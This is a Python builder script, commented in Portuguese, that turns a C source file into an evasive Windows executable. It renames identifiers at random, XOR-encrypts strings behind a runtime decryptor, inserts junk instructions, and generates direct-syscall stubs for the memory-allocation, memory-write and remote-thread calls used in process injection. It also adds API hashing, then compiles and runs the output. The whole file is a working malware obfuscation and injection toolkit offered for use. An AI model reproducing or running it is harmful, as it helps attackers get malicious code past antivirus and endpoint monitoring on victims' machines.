import random, string, re, subprocess, os, ctypes, pefile

def rand_name():
    return ''.join(random.choice(string.ascii_letters) for _ in range(10))

def rand_int():
    return random.randint(1000, 99999)

def xor_encode(s, key):
    return ','.join([str(ord(c)^key) for c in s])

def junk_code():
    samples = [
        "int j = %d; j = j*2 - 5;" % rand_int(),
        "for(int i=0;i<%d;i++){ __asm__(\"nop\"); }" % random.randint(2,6),
        "volatile int z = %d; z ^= %d;" % (rand_int(), rand_int())
    ]
    return samples[random.randint(0,len(samples)-1)]

def polymorph(code):
    # troca variáveis
    vars = re.findall(r"\b[a-zA-Z_][a-zA-Z0-9_]*\b", code)
    reserved = ["int","char","return","if","else","for","while","void","struct","include"]
    repl = {v:rand_name() for v in set(vars) if v not in reserved}
    for old,new in repl.items():
        code = re.sub(r"\b"+old+r"\b", new, code)

    # strings -> XOR
    strings = re.findall(r"\".*?\"", code)
    for s in strings:
        clean = s.strip('"')
        key = random.randint(1,255)
        enc = xor_encode(clean,key)
        decryptor = f"(char*)decrypt_str((int[]){{{enc}}}, {len(clean)}, {key})"
        code = code.replace(s,decryptor)

    # junk aleatório
    lines = code.splitlines()
    out=[]
    for l in lines:
        out.append(l)
        if ";" in l and random.random()>0.5:
            out.append(junk_code())
    return "\n".join(out)

def get_syscall_number(api):
    # resolve SSN via ntdll export table
    ntdll = ctypes.WinDLL("ntdll.dll")
    addr = ctypes.windll.kernel32.GetProcAddress(ntdll._handle, api.encode())
    pe = pefile.PE("C:\\Windows\\System32\\ntdll.dll")
    base = pe.OPTIONAL_HEADER.ImageBase
    rva = addr - base
    data = pe.get_memory_mapped_image()[rva:rva+20]
    ssn = data[4] | (data[5] << 8)
    return ssn

def gen_syscall_stub(api):
    ssn = get_syscall_number(api)
    fname = rand_name()
    return f"""
__declspec(naked) NTSTATUS {fname}(...) {{
    __asm {{
        mov r10, rcx
        mov eax, {ssn}
        syscall
        ret
    }}
}}
"""

# decryptor
decryptor = r"""
char* decrypt_str(int data[], int len, int key){
    char* out=(char*)malloc(len+1);
    for(int i=0;i<len;i++){ out[i]=(char)(data[i]^key); }
    out[len]=0;
    return out;
}
"""

# api hash
api_hash = r"""
DWORD hash(char *name) {
    DWORD h = 0;
    while(*name) {
        h = ((h << 5) + h) + *name++;
    }
    return h;
}
"""

# builder pipeline
with open("base.c","r") as f:
    code = f.read()

code = polymorph(code)

syscalls = ["NtAllocateVirtualMemory", "NtWriteVirtualMemory", "NtCreateThreadEx"]
stubs = "\n".join([gen_syscall_stub(api) for api in syscalls])

final_code = "#include <windows.h>\n#include <stdlib.h>\n" + api_hash + decryptor + stubs + code

out_file = "build_" + rand_name() + ".c"
with open(out_file,"w") as f:
    f.write(final_code)

print("[+] Código gerado:", out_file)

# compila
exe_file = out_file.replace(".c",".exe")
subprocess.run(["x86_64-w64-mingw32-gcc", out_file, "-o", exe_file])

# teste básico
if os.path.exists(exe_file):
    print("[+] Build OK:", exe_file)
    ret = subprocess.run([exe_file], capture_output=True)
    print("[+] Saída de teste:", ret.stdout.decode(errors="ignore"))
